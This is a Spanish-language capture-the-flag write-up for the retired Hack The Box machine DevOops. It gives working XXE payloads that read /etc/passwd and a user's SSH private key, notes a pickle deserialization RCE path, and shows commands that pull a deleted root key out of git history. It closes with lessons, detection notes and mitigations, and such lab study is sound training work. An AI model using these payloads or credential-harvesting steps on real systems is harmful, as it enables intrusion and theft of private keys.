---
machine: DevOops
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, xxe, flask, git-history, ssh-keys, pickle]
---

# DevOops — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired (ref.), publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

API de blog en Flask/Gunicorn (5000) con un endpoint `/upload` que parsea **XML** sin desactivar entidades externas: **XXE** que lee ficheros del servidor, empezando por la clave SSH de `roosa`. Ya dentro, el `.bash_history` lleva a un repositorio git en `~/work/blogfeed`; el **historial de commits** conserva una clave privada de **root** que se borró más tarde.

## Reconocimiento

```bash
nmap -p- --min-rate 5000 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp    ssh   OpenSSH 7.2p2 Ubuntu 4ubuntu2.4
5000/tcp  http  Gunicorn (Flask)
```

```bash
gobuster dir -u http://<IP>:5000/ -w /usr/share/wordlists/dirb/common.txt
```

```text
/feed    (200)
/upload  (200)
```

La web permite enviar un «post» en XML y verlo procesado. El mensaje de respuesta incluye los campos del XML, lo que ya sugiere un parser con entidades activas.

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<Post>
  <Author>a</Author>
  <Subject>s</Subject>
  <Content>&xxe;</Content>
</Post>
```

```bash
curl -s -X POST http://<IP>:5000/upload -H 'Content-Type: application/xml' --data-binary @payload.xml
```

`/etc/passwd` confirma la lectura y muestra `roosa`. Se apunta a su clave:

```xml
<!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa">
```

La respuesta trae la clave privada completa (el error del parser también puede filtrarla en casos ciegos con `php://filter`, aquí no hace falta).

```bash
chmod 600 id_rsa
ssh -i id_rsa roosa@<IP>
cat ~/user.txt
```

Vía alternativa (no la usada aquí): el endpoint `/newpost` deserializa con **`pickle`** el cuerpo en base64 (la ruta nace en `src/feed.py`), lo que da RCE como `roosa` directamente. El código está en `/home/roosa/deploy/src/feed.py`.

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

```bash
cat ~/.bash_history
```

Aparecen `mv resources/authcredentials.key ...`, `git add` y `git commit`. El repositorio está en `~/work/blogfeed`:

```bash
cd ~/work/blogfeed
git log --oneline
git log -p | grep -A30 "BEGIN RSA PRIVATE KEY"
```

Un commit posterior eliminó la clave; el anterior todavía la contiene:

```bash
git show <commit>:resources/integration/authcredentials.key > /tmp/root.key
chmod 600 /tmp/root.key
ssh -i /tmp/root.key root@<IP>
cat /root/root.txt
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- Un parser XML con entidades externas activas es lectura arbitraria de ficheros, y las claves SSH son el botín natural.
- `pickle` en el mismo servicio es una segunda vía de RCE: dos fallos, un solo endpoint mal diseñado.
- `git` no olvida: un secreto borrado en el HEAD sigue en el historial, y el `.bash_history` dice dónde mirar.
- Detección: XML con `DOCTYPE`/`ENTITY` en peticiones, y accesos SSH con claves desde IPs nuevas.

## Mitigaciones y detección

- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.
- Deshabilitar entidades externas y DTD en el parser XML.

## Referencias

- [xxe](../../../knowledge/web/xxe.md)
